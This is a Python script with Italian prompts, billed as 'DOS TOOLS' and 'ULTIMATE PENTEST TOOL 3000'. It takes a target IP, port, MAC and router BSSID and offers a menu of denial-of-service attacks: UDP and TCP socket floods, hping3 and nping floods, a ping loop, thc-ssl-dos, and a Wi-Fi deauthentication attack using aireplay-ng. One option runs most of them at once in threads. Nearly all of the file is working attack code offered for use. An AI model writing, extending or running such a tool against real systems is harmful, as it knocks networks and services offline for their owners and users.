import os
import socket
import subprocess
import threading
import time
import pyfiglet

# Input iniziali
target_ip = input("Inserisci l'IP del target: ")
target_port = int(input("Inserisci la porta del target: "))
mac_target = input("Inserisci il MAC del target Wi-Fi (es: AA:BB:CC:DD:EE:FF): ")
router_bssid = input("Inserisci il BSSID del router (es: 11:22:33:44:55:66): ")
porta = input("Inserisci la porta: ")

interface = "wlan0"

def print_ascii():
    ascii_art = pyfiglet.figlet_format("DOS TOOLS")
    print(ascii_art)

# UDP Flood
def udp_flood():
    print("Inizio UDP Flood...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = os.urandom(2048)
    while True:
        sock.sendto(bytes_data, (target_ip, target_port))

# TCP Flood
def tcp_flood():
    print("Inizio TCP Flood...")
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(os.urandom(1024))
            s.close()
        except:
            pass

# Hping
def hping():
    print("Inizio hping Dos....")
    while True:
        subprocess.call(["hping3", "--flood", "--udp", "--icmp", "-i", "u100", target_ip])

# Ping Bomb
def ping_bomb():
    print("Inizio Ping Bomb...")
    while True:
        subprocess.call(["ping", "-c", "1", target_ip])

# Wi-Fi Deauth
def deauth():
    print("Inizio Deauth Attack con aireplay-ng...")
    subprocess.call(["airmon-ng", "start", interface])
    time.sleep(2)
    subprocess.call(["aireplay-ng", "--deauth", "1000000", "-a", router_bssid, "-c", mac_target, interface + "mon"])

# Nping
def nping():
    print("Inizio Nping....")
    while True:
        subprocess.call(["nping", "--count", "0", "--rate", "100000", "--tcp", target_ip])

def thc():
    print("inizio thc-ssl-dos....")
    while True:
        subprocess.call(["thc-ssl-dos", "-l", "500", target_ip, porta, "--accept"])

# Menu principale
def menu():
    print_ascii()
    print("\n--- ULTIMATE PENTEST TOOL 3000 ---")
    print("0. Nping")
    print("1. UDP Flood")
    print("2. TCP Flood")
    print("3. Ping Bomb")
    print("4. Wi-Fi Deauth")
    print("5. Hping")
    print("6. All program")
    print("7. thc-ssl-dos")
    print("qq. Esci")
    scelta = input("Scegli un'opzione: ")

    if scelta == "7":
       thc()
    if scelta == "5":
       hping()
    if scelta == "0":
        nping()
    if scelta == "1":
        udp_flood()
    elif scelta == "2":
        tcp_flood()
    elif scelta == "3":
        ping_bomb()
    elif scelta == "4":
        deauth()
    elif scelta == "6":
        threading.Thread(target=udp_flood).start()
        threading.Thread(target=tcp_flood).start()
        threading.Thread(target=ping_bomb).start()
        threading.Thread(target=nping).start()
        threading.Thread(target=hping).start()
        threading.Thread(target=thc).start()
    elif scelta == "qq":
        print("Uscita...")
        exit()
    else:
        print("Scelta non valida.")
        menu()

# Avvia menu
menu()



